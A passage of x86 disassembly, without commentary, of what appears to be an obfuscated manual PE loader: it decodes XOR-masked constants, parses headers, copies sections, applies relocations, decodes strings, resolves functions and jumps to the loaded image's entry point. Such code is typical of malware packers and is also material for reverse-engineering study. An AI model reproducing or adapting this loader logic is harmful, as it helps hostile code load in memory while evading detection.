  421993:	xor    esi,ecx
  421995:	add    esi,edx
  421997:	mov    DWORD PTR [ebp-0x8],esi
  42199a:	push   ebx
  42199b:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4219a2:	jmp    0x421a3e
  4219a7:	mov    esi,DWORD PTR [ebp-0x4]
  4219aa:	xor    esi,ecx
  4219ac:	lea    edi,[ebx-0x8]
  4219af:	add    esi,edx
  4219b1:	shr    edi,1
  4219b3:	cmp    esi,edi
  4219b5:	jae    0x421a24
  4219b7:	sub    edi,esi
  4219b9:	lea    ebx,[eax+esi*2+0x8]
  4219bd:	mov    DWORD PTR [ebp-0x18],edi
  4219c0:	movzx  esi,WORD PTR [ebx]
  4219c3:	and    esi,0xfff
  4219c9:	mov    DWORD PTR [ebp-0x14],esi
  4219cc:	mov    edi,DWORD PTR [ebp-0x14]
  4219cf:	mov    esi,DWORD PTR [eax]
  4219d1:	sub    esi,edx
  4219d3:	add    edi,esi
  4219d5:	movzx  esi,WORD PTR [ebx]
  4219d8:	shr    esi,0xc
  4219db:	xor    edi,ecx
  4219dd:	mov    DWORD PTR [ebp-0x20],edi
  4219e0:	mov    DWORD PTR [ebp-0x14],esi
  4219e3:	mov    esi,DWORD PTR [ebp-0x20]
  4219e6:	mov    edi,DWORD PTR [ebp+0x8]
  4219e9:	xor    esi,ecx
  4219eb:	lea    esi,[esi+edi*1+0x3272fa]
  4219f2:	mov    DWORD PTR [ebp-0x20],esi
  4219f5:	mov    esi,DWORD PTR [ebp-0x10]
  4219f8:	mov    edi,DWORD PTR [ebp-0x14]
  4219fb:	xor    esi,ecx
  4219fd:	add    esi,edx
  4219ff:	cmp    edi,esi
  421a01:	jne    0x421a19
  421a03:	mov    esi,DWORD PTR [ebp-0x10]
  421a06:	mov    edi,DWORD PTR [ebp-0x14]
  421a09:	xor    esi,ecx
  421a0b:	add    esi,edx
  421a0d:	cmp    edi,esi
  421a0f:	jne    0x421a19
  421a11:	mov    esi,DWORD PTR [ebp-0x20]
  421a14:	mov    edi,DWORD PTR [ebp-0x24]
  421a17:	add    DWORD PTR [esi],edi
  421a19:	add    ebx,0x2
  421a1c:	dec    DWORD PTR [ebp-0x18]
  421a1f:	jne    0x4219c0
  421a21:	mov    ebx,DWORD PTR [ebp-0xc]
  421a24:	add    DWORD PTR [ebp-0x8],ebx
  421a27:	mov    esi,DWORD PTR [ebp-0x1c]
  421a2a:	mov    edi,DWORD PTR [ebp-0x8]
  421a2d:	mov    ebx,DWORD PTR [ebp+0xc]
  421a30:	xor    esi,ecx
  421a32:	cmp    edi,DWORD PTR [ebx+esi*8+0x193984c]
  421a39:	jae    0x421a53
  421a3b:	add    eax,DWORD PTR [ebp-0xc]
  421a3e:	mov    esi,DWORD PTR [ebp-0x4]
  421a41:	mov    ebx,DWORD PTR [eax+0x4]
  421a44:	xor    esi,ecx
  421a46:	add    esi,edx
  421a48:	mov    DWORD PTR [ebp-0xc],ebx
  421a4b:	cmp    ebx,esi
  421a4d:	jne    0x4219a7
  421a53:	pop    ebx
  421a54:	mov    eax,DWORD PTR [ebp-0x28]
  421a57:	pop    edi
  421a58:	jmp    0x421a5d
  421a5a:	mov    eax,DWORD PTR [ebp-0x4]
  421a5d:	xor    eax,ecx
  421a5f:	add    eax,edx
  421a61:	pop    esi
  421a62:	leave  
  421a63:	ret    0x8
  421a66:	push   ebp
  421a67:	mov    ebp,esp
  421a69:	sub    esp,0xd8
  421a6f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  421a76:	mov    DWORD PTR [ebp-0x24],0xf89c85b4
  421a7d:	mov    eax,DWORD PTR [ebp-0x4]
  421a80:	push   ebx
  421a81:	push   esi
  421a82:	mov    esi,0x75108b3
  421a87:	xor    eax,esi
  421a89:	push   edi
  421a8a:	mov    edi,0x3272fa
  421a8f:	add    eax,edi
  421a91:	mov    DWORD PTR [ebp-0x18],eax
  421a94:	mov    eax,DWORD PTR [ebp-0x4]
  421a97:	xor    eax,esi
  421a99:	add    eax,edi
  421a9b:	mov    DWORD PTR [ebp-0x8],eax
  421a9e:	mov    ebx,DWORD PTR [ebp+0x20]
  421aa1:	mov    eax,DWORD PTR [ebp-0x1c]
  421aa4:	mov    ecx,DWORD PTR [ebp-0x1c]
  421aa7:	xor    eax,ecx
  421aa9:	mov    DWORD PTR [ebp-0x1c],eax
  421aac:	add    DWORD PTR [ebp-0x1c],0xf89cb5b5
  421ab3:	mov    eax,DWORD PTR [ebp-0xc]
  421ab6:	mov    ecx,DWORD PTR [ebp-0xc]
  421ab9:	xor    eax,ecx
  421abb:	mov    DWORD PTR [ebp-0xc],eax
  421abe:	add    DWORD PTR [ebp-0xc],0xf89c85f5
  421ac5:	mov    eax,DWORD PTR [ebp-0x10]
  421ac8:	mov    ecx,DWORD PTR [ebp-0x10]
  421acb:	xor    eax,ecx
  421acd:	mov    DWORD PTR [ebp-0x10],eax
  421ad0:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  421ad7:	mov    eax,DWORD PTR [ebp-0x28]
  421ada:	mov    ecx,DWORD PTR [ebp-0x28]
  421add:	xor    eax,ecx
  421adf:	mov    DWORD PTR [ebp-0x28],eax
  421ae2:	add    DWORD PTR [ebp-0x28],0xf89f05b5
  421ae9:	mov    DWORD PTR [ebp+0x20],0xf89cefe0
  421af0:	mov    eax,DWORD PTR [ebp+0x8]
  421af3:	test   eax,eax
  421af5:	je     0x421f7c
  421afb:	mov    eax,DWORD PTR [ebp+0xc]
  421afe:	test   eax,eax
  421b00:	je     0x421f7c
  421b06:	mov    eax,DWORD PTR [ebp+0x18]
  421b09:	test   eax,eax
  421b0b:	je     0x421f7c
  421b11:	mov    eax,DWORD PTR [ebp+0x20]
  421b14:	mov    ecx,DWORD PTR [ebp+0x8]
  421b17:	xor    eax,0x8b3
  421b1c:	add    eax,0x72fa
  421b21:	cmp    WORD PTR [ecx],ax
  421b24:	jne    0x421f7c
  421b2a:	mov    eax,DWORD PTR [ebp-0x4]
  421b2d:	xor    eax,esi
  421b2f:	add    eax,edi
  421b31:	mov    DWORD PTR [ebp-0x30],eax
  421b34:	mov    eax,DWORD PTR [ebp-0x4]
  421b37:	mov    ecx,DWORD PTR [ebp+0x8]
  421b3a:	mov    eax,DWORD PTR [ebp+0x8]
  421b3d:	add    eax,DWORD PTR [ecx+0x3c]
  421b40:	mov    DWORD PTR [ebp+0xc],eax
  421b43:	mov    eax,DWORD PTR [eax+0x50]
  421b46:	test   eax,eax
  421b48:	je     0x421f7c
  421b4e:	mov    DWORD PTR [ebp-0x2c],0xf88c85b5
  421b55:	mov    eax,DWORD PTR [ebp-0x2c]
  421b58:	xor    eax,esi
  421b5a:	add    eax,edi
  421b5c:	mov    DWORD PTR [ebp-0x2c],eax
  421b5f:	mov    eax,DWORD PTR [ebp-0x4]
  421b62:	mov    eax,DWORD PTR [ebx+0x190]
  421b68:	mov    ecx,DWORD PTR [eax]
  421b6a:	mov    ecx,DWORD PTR [ecx+0x3c]
  421b6d:	add    ecx,DWORD PTR [eax]
  421b6f:	mov    eax,DWORD PTR [ebp-0x4]
  421b72:	mov    eax,DWORD PTR [ebx+0x18c]
  421b78:	mov    edx,DWORD PTR [eax]
  421b7a:	mov    DWORD PTR [ebp-0x20],ecx
  421b7d:	mov    DWORD PTR [ebp+0x20],edx
  421b80:	cmp    edx,edx
  421b82:	jne    0x421bb6
  421b84:	mov    eax,DWORD PTR [ebx+0x1e0]
  421b8a:	lea    edx,[ebp-0x18]
  421b8d:	push   edx
  421b8e:	mov    edx,DWORD PTR [ebp-0xc]
  421b91:	xor    edx,esi
  421b93:	add    edx,edi
  421b95:	push   edx
  421b96:	push   DWORD PTR [ecx+0x50]
  421b99:	push   DWORD PTR [ebp+0x20]
  421b9c:	call   DWORD PTR [eax+0x1c]
  421b9f:	mov    eax,DWORD PTR [ebp-0x20]
  421ba2:	mov    ecx,DWORD PTR [eax+0x54]
  421ba5:	mov    eax,DWORD PTR [eax+0x50]
  421ba8:	sub    eax,ecx
  421baa:	add    ecx,DWORD PTR [ebp+0x20]
  421bad:	push   ecx
  421bae:	call   0x422519
  421bb3:	mov    edx,DWORD PTR [ebp+0x20]
  421bb6:	mov    eax,DWORD PTR [ebx+0x194]
  421bbc:	mov    DWORD PTR [eax],edx
  421bbe:	mov    eax,DWORD PTR [ebp+0xc]
  421bc1:	push   DWORD PTR [eax+0x54]
  421bc4:	push   DWORD PTR [ebp+0x8]
  421bc7:	push   edx
  421bc8:	call   0x42240f
  421bcd:	mov    ecx,DWORD PTR [ebp+0x20]
  421bd0:	mov    eax,DWORD PTR [ecx+0x3c]
  421bd3:	add    eax,ecx
  421bd5:	movzx  ecx,WORD PTR [eax+0x14]
  421bd9:	lea    ecx,[ecx+eax*1+0x18]
  421bdd:	mov    DWORD PTR [ebp+0x18],ecx
  421be0:	mov    ecx,DWORD PTR [ebp-0x4]
  421be3:	movzx  edx,WORD PTR [eax+0x6]
  421be7:	xor    ecx,esi
  421be9:	add    ecx,edi
  421beb:	mov    DWORD PTR [ebp+0xc],eax
  421bee:	cmp    edx,ecx
  421bf0:	je     0x421c9d
  421bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  421bf9:	xor    ecx,esi
  421bfb:	add    ecx,edi
  421bfd:	mov    DWORD PTR [ebp-0x8],ecx
  421c00:	mov    ecx,DWORD PTR [ebp-0x24]
  421c03:	movzx  edx,WORD PTR [eax+0x6]
  421c07:	xor    ecx,esi
  421c09:	sub    edx,ecx
  421c0b:	sub    edx,edi
  421c0d:	cmp    DWORD PTR [ebp-0x8],edx
  421c10:	ja     0x421c9d
  421c16:	mov    edx,DWORD PTR [ebp+0x18]
  421c19:	add    edx,0x8
  421c1c:	mov    DWORD PTR [ebp+0x18],edx
  421c1f:	jmp    0x421c24
  421c21:	mov    edx,DWORD PTR [ebp+0x18]
  421c24:	mov    eax,DWORD PTR [eax+0x38]
  421c27:	lea    ecx,[eax-0x1]
  421c2a:	mov    DWORD PTR [ebp-0x38],eax
  421c2d:	mov    eax,DWORD PTR [edx]
  421c2f:	test   eax,ecx
  421c31:	je     0x421c3a
  421c33:	not    ecx
  421c35:	and    eax,ecx
  421c37:	add    eax,DWORD PTR [ebp-0x38]
  421c3a:	mov    ecx,DWORD PTR [edx+0x4]
  421c3d:	add    ecx,DWORD PTR [ebp+0x20]
  421c40:	push   ecx
  421c41:	call   0x422519
  421c46:	mov    edx,DWORD PTR [ebp-0x4]
  421c49:	mov    eax,DWORD PTR [ebp+0x18]
  421c4c:	mov    ecx,DWORD PTR [eax+0x8]
  421c4f:	xor    edx,esi
  421c51:	add    edx,edi
  421c53:	cmp    ecx,edx
  421c55:	je     0x421c6e
  421c57:	push   ecx
  421c58:	mov    ecx,DWORD PTR [ebp+0x8]
  421c5b:	add    ecx,DWORD PTR [eax+0xc]
  421c5e:	mov    eax,DWORD PTR [eax+0x4]
  421c61:	add    eax,DWORD PTR [ebp+0x20]
  421c64:	push   ecx
  421c65:	push   eax
  421c66:	call   0x42240f
  421c6b:	mov    eax,DWORD PTR [ebp+0x18]
  421c6e:	mov    ecx,DWORD PTR [ebp-0x24]
  421c71:	mov    edx,DWORD PTR [ebp-0x8]
  421c74:	add    eax,0x28
  421c77:	xor    ecx,esi
  421c79:	lea    ecx,[edx+ecx*1+0x3272fa]
  421c80:	mov    edx,DWORD PTR [ebp+0xc]
  421c83:	mov    DWORD PTR [ebp+0x18],eax
  421c86:	mov    eax,DWORD PTR [ebp-0x24]
  421c89:	movzx  edx,WORD PTR [edx+0x6]
  421c8d:	xor    eax,esi
  421c8f:	sub    edx,eax
  421c91:	mov    eax,DWORD PTR [ebp+0xc]
  421c94:	sub    edx,edi
  421c96:	mov    DWORD PTR [ebp-0x8],ecx
  421c99:	cmp    ecx,edx
  421c9b:	jbe    0x421c21
  421c9d:	mov    edx,DWORD PTR [ebx+0x18c]
  421ca3:	mov    ecx,DWORD PTR [ebp+0x20]
  421ca6:	cmp    ecx,DWORD PTR [edx]
  421ca8:	jne    0x421cd1
  421caa:	mov    eax,DWORD PTR [ebx+0x1e0]
  421cb0:	lea    edx,[ebp-0x18]
  421cb3:	push   edx
  421cb4:	mov    edx,DWORD PTR [ebp-0x10]
  421cb7:	xor    edx,esi
  421cb9:	add    edx,edi
  421cbb:	push   edx
  421cbc:	mov    edx,DWORD PTR [ebp-0x20]
  421cbf:	push   DWORD PTR [edx+0x54]
  421cc2:	push   ecx
  421cc3:	call   DWORD PTR [eax+0x1c]
  421cc6:	test   eax,eax
  421cc8:	je     0x421f6d
  421cce:	mov    eax,DWORD PTR [ebp+0xc]
  421cd1:	mov    ecx,DWORD PTR [ebx+0x1c8]
  421cd7:	mov    ecx,DWORD PTR [ecx]
  421cd9:	xor    ecx,esi
  421cdb:	add    ecx,edi
  421cdd:	je     0x421e98
  421ce3:	mov    eax,DWORD PTR [ebp-0x4]
  421ce6:	xor    eax,esi
  421ce8:	add    eax,edi
  421cea:	and    DWORD PTR [ebp+0x8],0x0
  421cee:	mov    DWORD PTR [ebp-0x14],eax
  421cf1:	mov    eax,0xf89c85d9
  421cf6:	lea    ecx,[eax-0x18]
  421cf9:	mov    DWORD PTR [ebp-0x58],0xf89c85c7
  421d00:	mov    DWORD PTR [ebp-0x54],0xf89c85c9
  421d07:	mov    DWORD PTR [ebp-0x50],eax
  421d0a:	mov    DWORD PTR [ebp-0x4c],ecx
  421d0d:	mov    DWORD PTR [ebp-0x48],ecx
  421d10:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  421d17:	mov    edx,DWORD PTR [ebp+0x8]
  421d1a:	mov    ecx,0x8b3
  421d1f:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  421d24:	mov    edx,0x72fa
  421d29:	add    cx,dx
  421d2c:	mov    edx,DWORD PTR [ebp+0x8]
  421d2f:	inc    DWORD PTR [ebp+0x8]
  421d32:	cmp    DWORD PTR [ebp+0x8],0x6
  421d36:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  421d3e:	jb     0x421d17
  421d40:	mov    ecx,0xf89c85cb
  421d45:	mov    DWORD PTR [ebp-0xb0],eax
  421d4b:	mov    DWORD PTR [ebp-0x9c],eax
  421d51:	mov    DWORD PTR [ebp-0x74],eax
  421d54:	mov    DWORD PTR [ebp-0x70],eax
  421d57:	lea    eax,[ecx-0x1]
  421d5a:	lea    edx,[ecx+0x34]
  421d5d:	mov    DWORD PTR [ebp-0x64],eax
  421d60:	mov    DWORD PTR [ebp-0x60],eax
  421d63:	mov    DWORD PTR [ebp-0xb4],0xf89c85e1
  421d6d:	mov    DWORD PTR [ebp-0xac],ecx
  421d73:	mov    DWORD PTR [ebp-0xa8],edx
  421d79:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  421d83:	mov    DWORD PTR [ebp-0xa0],0xf89c85c7
  421d8d:	mov    DWORD PTR [ebp-0x98],0xf89c85f8
  421d97:	mov    DWORD PTR [ebp-0x94],0xf89c85c7
  421da1:	mov    DWORD PTR [ebp-0x90],0xf89c85c9
  421dab:	mov    DWORD PTR [ebp-0x8c],ecx
  421db1:	mov    DWORD PTR [ebp-0x88],0xf89c85cc
  421dbb:	mov    DWORD PTR [ebp-0x84],edx
  421dc1:	mov    DWORD PTR [ebp-0x80],0xf89c85c6
  421dc8:	mov    DWORD PTR [ebp-0x7c],ecx
  421dcb:	mov    DWORD PTR [ebp-0x78],0xf89c85f4
  421dd2:	mov    DWORD PTR [ebp-0x6c],ecx
  421dd5:	mov    DWORD PTR [ebp-0x68],0xf89c85d8
  421ddc:	mov    DWORD PTR [ebp-0x5c],0xf89c85b5
  421de3:	xor    eax,eax
  421de5:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  421dec:	xor    cl,0xb3
  421def:	sub    cl,0x6
  421df2:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  421df9:	inc    eax
  421dfa:	cmp    eax,0x17
  421dfd:	jb     0x421de5
  421dff:	mov    eax,DWORD PTR [ebx+0x1e0]
  421e05:	lea    ecx,[ebp-0xc0]
  421e0b:	push   ecx
  421e0c:	call   DWORD PTR [eax+0x4]
  421e0f:	mov    ecx,DWORD PTR [ebx+0x1e0]
  421e15:	lea    edx,[ebp-0xd8]
  421e1b:	push   edx
  421e1c:	push   eax
  421e1d:	call   DWORD PTR [ecx+0x8]
  421e20:	mov    DWORD PTR [ebp-0x40],eax
  421e23:	lea    eax,[ebp-0x14]
  421e26:	push   eax
  421e27:	mov    eax,DWORD PTR [ebx+0x18c]
  421e2d:	push   DWORD PTR [eax]
  421e2f:	mov    eax,DWORD PTR [ebp-0x40]
  421e32:	call   eax
  421e34:	mov    eax,DWORD PTR [ebp-0x4]
  421e37:	xor    eax,esi
  421e39:	add    eax,edi
  421e3b:	mov    DWORD PTR [ebp-0x34],eax
  421e3e:	mov    ecx,DWORD PTR [ebp-0x4]
  421e41:	mov    eax,DWORD PTR [ebp-0x14]
  421e44:	xor    ecx,esi
  421e46:	add    ecx,edi
  421e48:	cmp    eax,ecx
  421e4a:	je     0x421e95
  421e4c:	mov    DWORD PTR [ebp-0x3c],eax
  421e4f:	jmp    0x421e60
  421e51:	mov    eax,DWORD PTR [eax]
  421e53:	mov    ecx,DWORD PTR [ebp-0x3c]
  421e56:	mov    DWORD PTR [ebp-0x14],eax
  421e59:	mov    eax,DWORD PTR [ebp-0x14]
  421e5c:	cmp    eax,ecx
  421e5e:	je     0x421e6d
  421e60:	mov    edx,DWORD PTR [eax+0x18]
  421e63:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e69:	cmp    edx,DWORD PTR [ecx]
  421e6b:	jne    0x421e51
  421e6d:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e73:	mov    edx,DWORD PTR [eax+0x18]
  421e76:	cmp    edx,DWORD PTR [ecx]
  421e78:	jne    0x421e95
  421e7a:	mov    ecx,DWORD PTR [ebx+0x190]
  421e80:	mov    edx,DWORD PTR [ebp-0x20]
  421e83:	mov    edx,DWORD PTR [edx+0x28]
  421e86:	add    edx,DWORD PTR [ecx]
  421e88:	mov    DWORD PTR [eax+0x1c],edx
  421e8b:	mov    eax,DWORD PTR [ebp-0x24]
  421e8e:	xor    eax,esi
  421e90:	add    eax,edi
  421e92:	mov    DWORD PTR [ebp-0x34],eax
  421e95:	mov    eax,DWORD PTR [ebp+0xc]
  421e98:	push   ebx
  421e99:	push   eax
  421e9a:	push   DWORD PTR [ebp+0x20]
  421e9d:	call   0x42161d
  421ea2:	test   eax,eax
  421ea4:	je     0x421f6d
  421eaa:	push   DWORD PTR [ebp+0xc]
  421ead:	mov    ecx,ebx
  421eaf:	push   DWORD PTR [ebp+0x20]
  421eb2:	call   0x421576
  421eb7:	test   eax,eax
  421eb9:	je     0x421f6d
  421ebf:	mov    eax,DWORD PTR [ebp+0xc]
  421ec2:	mov    edx,DWORD PTR [ebp+0x20]
  421ec5:	mov    ecx,ebx
  421ec7:	call   0x42144f
  421ecc:	test   eax,eax
  421ece:	je     0x421f6d
  421ed4:	push   ebx
  421ed5:	push   DWORD PTR [ebp+0x20]
  421ed8:	call   0x421900
  421edd:	test   eax,eax
  421edf:	je     0x421f6d
  421ee5:	mov    eax,DWORD PTR [ebx+0x18c]
  421eeb:	mov    edx,DWORD PTR [ebp+0x20]
  421eee:	cmp    edx,DWORD PTR [eax]
  421ef0:	jne    0x421f0c
  421ef2:	mov    eax,DWORD PTR [ebx+0x1e0]
  421ef8:	lea    ecx,[ebp-0x18]
  421efb:	push   ecx
  421efc:	push   DWORD PTR [ebp-0x18]
  421eff:	mov    ecx,DWORD PTR [ebp-0x20]
  421f02:	push   DWORD PTR [ecx+0x54]
  421f05:	push   edx
  421f06:	call   DWORD PTR [eax+0x1c]
  421f09:	mov    edx,DWORD PTR [ebp+0x20]
  421f0c:	mov    eax,DWORD PTR [ebx+0x1c8]
  421f12:	mov    eax,DWORD PTR [eax]
  421f14:	xor    eax,esi
  421f16:	add    eax,edi
  421f18:	je     0x421f51
  421f1a:	mov    ecx,DWORD PTR [ebp+0xc]
  421f1d:	mov    eax,DWORD PTR [ecx+0x28]
  421f20:	mov    DWORD PTR [ebp+0x8],0xf89ca5b5
  421f27:	mov    esi,DWORD PTR [ebp+0x8]
  421f2a:	push   DWORD PTR [ebp+0x14]
  421f2d:	xor    esi,0x8b3
  421f33:	push   DWORD PTR [ebp+0x10]
  421f36:	add    esi,0x72fa
  421f3c:	or     WORD PTR [ecx+0x16],si
  421f40:	add    eax,edx
  421f42:	push   edx
  421f43:	call   eax
  421f45:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b4
  421f4f:	jmp    0x421f5b
  421f51:	mov    eax,DWORD PTR [ebp+0xc]
  421f54:	mov    eax,DWORD PTR [eax+0x28]
  421f57:	add    eax,edx
  421f59:	call   eax
  421f5b:	mov    DWORD PTR [ebp-0x8],eax
  421f5e:	mov    eax,DWORD PTR [ebp-0x8]
  421f61:	mov    ecx,DWORD PTR [ebp+0x1c]
  421f64:	mov    DWORD PTR [ecx],eax
  421f66:	mov    DWORD PTR [ebp-0x30],0x1
  421f6d:	cmp    DWORD PTR [ebp-0x30],0x0
  421f71:	jne    0x421f77
  421f73:	and    DWORD PTR [ebp+0x20],0x0
  421f77:	mov    eax,DWORD PTR [ebp+0x20]
  421f7a:	jmp    0x421f7e
  421f7c:	xor    eax,eax
  421f7e:	pop    edi
  421f7f:	pop    esi
  421f80:	pop    ebx
  421f81:	leave  
  421f82:	ret    0x1c
  421f85:	push   ebp
  421f86:	mov    ebp,esp
  421f88:	movzx  edx,WORD PTR [ecx+0x6]
  421f8c:	movzx  eax,WORD PTR [ecx+0x14]
  421f90:	push   ebx
  421f91:	push   edi
  421f92:	xor    edi,edi
  421f94:	lea    eax,[eax+ecx*1+0x18]
  421f98:	test   edx,edx
  421f9a:	je     0x421fbb
  421f9c:	mov    ecx,DWORD PTR [eax+0xc]
  421f9f:	lea    ebx,[ecx+esi*1]
  421fa2:	cmp    DWORD PTR [ebp+0x8],ebx
  421fa5:	jb     0x421fb3
  421fa7:	mov    ebx,DWORD PTR [eax+0x8]
  421faa:	add    ebx,ecx
  421fac:	add    ebx,esi
  421fae:	cmp    DWORD PTR [ebp+0x8],ebx
  421fb1:	jb     0x421fbd
  421fb3:	add    eax,0x28
  421fb6:	inc    edi
  421fb7:	cmp    edi,edx
  421fb9:	jb     0x421f9c
  421fbb:	xor    eax,eax
  421fbd:	pop    edi
  421fbe:	pop    ebx
  421fbf:	pop    ebp
  421fc0:	ret    0x4
  421fc3:	push   ebp
  421fc4:	mov    ebp,esp
  421fc6:	sub    esp,0x34
  421fc9:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  421fd0:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  421fd7:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  421fde:	mov    DWORD PTR [ebp-0x8],0xf89c85d4
  421fe5:	mov    DWORD PTR [ebp-0x20],0xf89c85f4
  421fec:	mov    DWORD PTR [ebp-0x2c],0xf89c8533
  421ff3:	mov    DWORD PTR [ebp-0x2c],0xf89c85d3
  421ffa:	mov    DWORD PTR [ebp-0x10],eax
  421ffd:	mov    eax,DWORD PTR [ebp+0x8]
  422000:	mov    DWORD PTR [ebp-0x14],eax
  422003:	mov    eax,DWORD PTR [ebp-0xc]
  422006:	push   ebx
  422007:	mov    ecx,0x75108b3
  42200c:	xor    eax,ecx
  42200e:	push   esi
  42200f:	mov    esi,DWORD PTR [ebp-0x10]
  422012:	mov    edx,0x3272fa
  422017:	add    eax,edx
  422019:	push   edi
  42201a:	cmp    esi,eax
  42201c:	je     0x4221fb
  422022:	mov    eax,DWORD PTR [ebp-0xc]
  422025:	mov    esi,DWORD PTR [ebp-0x14]
  422028:	xor    eax,ecx
  42202a:	add    eax,edx
  42202c:	cmp    esi,eax
  42202e:	je     0x4221fb
  422034:	mov    eax,DWORD PTR [ebp-0xc]
  422037:	xor    eax,ecx
  422039:	add    eax,edx
  42203b:	mov    DWORD PTR [ebp-0x24],eax
  42203e:	mov    eax,DWORD PTR [ebp-0xc]
  422041:	xor    eax,ecx
  422043:	add    eax,edx
  422045:	mov    DWORD PTR [ebp-0x28],eax
  422048:	mov    edi,DWORD PTR [ebp-0x20]
  42204b:	mov    ebx,DWORD PTR [ebp-0x8]
  42204e:	mov    esi,0x8b3
  422053:	xor    edi,esi
  422055:	mov    eax,0x72fa
  42205a:	xor    ebx,esi
  42205c:	add    edi,eax
  42205e:	add    ebx,eax
  422060:	sub    ebx,edi
  422062:	mov    WORD PTR [ebp-0x8],bx
  422066:	jmp    0x42212b
  42206b:	mov    edi,DWORD PTR [ebp-0xc]
  42206e:	mov    bx,WORD PTR [ebp-0x4]
  422072:	xor    edi,esi
  422074:	add    edi,eax
  422076:	cmp    bx,di
  422079:	je     0x42216d
  42207f:	mov    edi,DWORD PTR [ebp-0xc]
  422082:	mov    ebx,DWORD PTR [ebp+0xc]
  422085:	xor    edi,ecx
  422087:	add    edi,edx
  422089:	cmp    ebx,edi
  42208b:	mov    di,WORD PTR [ebp-0x4]
  42208f:	mov    bx,WORD PTR [ebp+0x8]
  422093:	je     0x4220fe
  422095:	cmp    bx,di
  422098:	je     0x422107
  42209a:	mov    edi,DWORD PTR [ebp-0x20]
  42209d:	mov    bx,WORD PTR [ebp+0x8]
  4220a1:	xor    edi,esi
  4220a3:	add    edi,eax
  4220a5:	cmp    bx,di
  4220a8:	jb     0x4220c8
  4220aa:	mov    edi,DWORD PTR [ebp-0x2c]
  4220ad:	mov    bx,WORD PTR [ebp+0x8]
  4220b1:	xor    edi,esi
  4220b3:	add    edi,eax
  4220b5:	cmp    bx,di
  4220b8:	ja     0x4220c8
  4220ba:	movzx  edi,WORD PTR [ebp+0x8]
  4220be:	movzx  ebx,WORD PTR [ebp-0x8]
  4220c2:	add    edi,ebx
  4220c4:	mov    WORD PTR [ebp+0x8],di
  4220c8:	mov    edi,DWORD PTR [ebp-0x20]
  4220cb:	mov    bx,WORD PTR [ebp-0x4]
  4220cf:	xor    edi,esi
  4220d1:	add    edi,eax
  4220d3:	cmp    bx,di
  4220d6:	jb     0x4220f6
  4220d8:	mov    edi,DWORD PTR [ebp-0x2c]
  4220db:	mov    bx,WORD PTR [ebp-0x4]
  4220df:	xor    edi,esi
  4220e1:	add    edi,eax
  4220e3:	cmp    bx,di
  4220e6:	ja     0x4220f6
  4220e8:	movzx  edi,WORD PTR [ebp-0x4]
  4220ec:	movzx  ebx,WORD PTR [ebp-0x8]
  4220f0:	add    edi,ebx
  4220f2:	mov    WORD PTR [ebp-0x4],di
  4220f6:	mov    di,WORD PTR [ebp-0x4]
  4220fa:	mov    bx,WORD PTR [ebp+0x8]
  4220fe:	cmp    bx,di
  422101:	jne    0x4221fb
  422107:	mov    edi,DWORD PTR [ebp-0x1c]
  42210a:	mov    ebx,DWORD PTR [ebp-0x10]
  42210d:	xor    edi,ecx
  42210f:	lea    edi,[edi+ebx*1+0x3272fa]
  422116:	mov    DWORD PTR [ebp-0x10],edi
  422119:	mov    edi,DWORD PTR [ebp-0x1c]
  42211c:	mov    ebx,DWORD PTR [ebp-0x14]
  42211f:	xor    edi,ecx
  422121:	lea    edi,[edi+ebx*1+0x3272fa]
  422128:	mov    DWORD PTR [ebp-0x14],edi
  42212b:	mov    edi,DWORD PTR [ebp-0x24]
  42212e:	mov    ebx,DWORD PTR [ebp-0x10]
  422131:	mov    di,WORD PTR [ebx+edi*2]
  422135:	mov    WORD PTR [ebp+0x8],di
  422139:	mov    edi,DWORD PTR [ebp-0x28]
  42213c:	mov    ebx,DWORD PTR [ebp-0x14]
  42213f:	mov    di,WORD PTR [ebx+edi*2]
  422143:	mov    WORD PTR [ebp-0x4],di
  422147:	mov    edi,DWORD PTR [ebp-0xc]
  42214a:	mov    bx,WORD PTR [ebp+0x8]
  42214e:	xor    edi,esi
  422150:	add    edi,eax
  422152:	cmp    bx,di
  422155:	jne    0x42206b
  42215b:	mov    eax,DWORD PTR [ebp-0x18]
  42215e:	mov    esi,DWORD PTR [ebp-0xc]
  422161:	xor    eax,ecx
  422163:	add    eax,edx
  422165:	imul   eax,esi
  422168:	mov    DWORD PTR [ebp-0xc],eax
  42216b:	jmp    0x42217f
  42216d:	mov    eax,DWORD PTR [ebp-0xc]
  422170:	mov    esi,DWORD PTR [ebp-0x18]
  422173:	xor    eax,ecx
  422175:	lea    eax,[eax+esi*1+0x3272fa]
  42217c:	mov    DWORD PTR [ebp-0x18],eax
  42217f:	mov    eax,DWORD PTR [ebp-0x24]
  422182:	sub    eax,edx
  422184:	xor    eax,ecx
  422186:	mov    DWORD PTR [ebp-0x30],eax
  422189:	mov    eax,DWORD PTR [ebp-0x28]
  42218c:	sub    eax,edx
  42218e:	xor    eax,ecx
  422190:	mov    DWORD PTR [ebp-0x34],eax
  422193:	mov    eax,DWORD PTR [ebp-0x34]
  422196:	mov    esi,DWORD PTR [ebp-0x1c]
  422199:	xor    esi,ecx
  42219b:	add    esi,edx
  42219d:	xor    eax,ecx
  42219f:	add    eax,0x3272fa
  4221a4:	imul   esi,eax
  4221a7:	mov    eax,DWORD PTR [ebp-0x14]
  4221aa:	movzx  eax,WORD PTR [esi+eax*1]
  4221ae:	mov    esi,DWORD PTR [ebp-0x30]
  4221b1:	mov    edi,DWORD PTR [ebp-0x1c]
  4221b4:	xor    esi,ecx
  4221b6:	add    esi,edx
  4221b8:	xor    edi,ecx
  4221ba:	add    edi,edx
  4221bc:	imul   edi,esi
  4221bf:	mov    esi,DWORD PTR [ebp-0x10]
  4221c2:	movzx  esi,WORD PTR [edi+esi*1]
  4221c6:	sub    eax,edx
  4221c8:	sub    esi,edx
  4221ca:	xor    eax,ecx
